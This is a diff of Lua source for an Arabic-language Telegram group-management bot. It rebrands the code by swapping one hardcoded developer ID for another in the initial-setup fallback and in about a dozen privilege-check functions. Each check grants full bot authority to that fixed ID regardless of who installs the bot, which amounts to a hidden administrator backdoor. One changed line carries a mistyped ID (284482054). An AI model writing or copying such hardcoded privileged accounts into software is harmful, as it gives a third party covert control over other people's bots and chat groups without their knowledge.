@@ -27,7 +27,7 @@ local AutoSet = function()
 io.write("\27[31;47m Ξ • الان ارسل ايدي المطور •\n Ξ   • Now send your id • \27[0;34;49m\n")  
 local SUDO = tonumber(io.read())   
 if not tostring(SUDO):match('%d+') then  
-local SUDO = 218385683
+local SUDO = 84482054
 end
 io.write("\27[31;47m Ξ • الان ارسل معرف المطور •\n Ξ • Now send your username • \27[0;34;49m\n")  
 local username = io.read()
@@ -123,7 +123,7 @@ return var end
 function is_leaderid(user_id)
 local var = false
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -135,7 +135,7 @@ if msg.sender_user_id_ == v then
 var = true
 end end
 if msg.sender_user_id_ == tonumber(DevId) then var = true end
-if msg.sender_user_id_ == tonumber(218385683) then var = true end 
+if msg.sender_user_id_ == tonumber(84482054) then var = true end 
 if msg.sender_user_id_ == tonumber(84482054) then var = true end 
 return var end
 
@@ -146,7 +146,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -161,7 +161,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -178,7 +178,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -197,7 +197,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -218,7 +218,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -245,7 +245,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -262,7 +262,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(284482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -281,7 +281,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -302,7 +302,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -327,7 +327,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -356,7 +356,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(DevId) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(84482054) then var = true end 
 if user_id == tonumber(84482054) then var = true end 
 return var end
 --     Source DevProx     --
@@ -4517,7 +4517,7 @@ resolve_username(for_abs[2],hamss)
 end
 end
 if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  
-Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تستطيع ٱرسٱڵ ٱڵهمسه بسريه تٱمه ٱڵى ٱلٱعضٱء عن طريق بوت ٱڵحمٱيه \n☬︙ٱستخدم ٱلٱمر كٱلٱتي ↫ ⤈ \n( اهمس + الهمسه + المعرف )\n☬︙مثٱڵ ٱوضح ↫ ⤈ \n( اهمس مرحبا [@IQ_ABS] )', 1, 'md')
+Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تستطيع ٱرسٱڵ ٱڵهمسه بسريه تٱمه ٱڵى ٱلٱعضٱء عن طريق بوت ٱڵحمٱيه \n☬︙ٱستخدم ٱلٱمر كٱلٱتي ↫ ⤈ \n( اهمس + الهمسه + المعرف )\n☬︙مثٱڵ ٱوضح ↫ ⤈ \n( اهمس مرحبا [@QQQAQ] )', 1, 'md')
 end
 if text and text:match("/start hms(.*)_(%d+)") then 
 for_abs = {string.match(text, "^/start hms(.*)_(%d+)")}
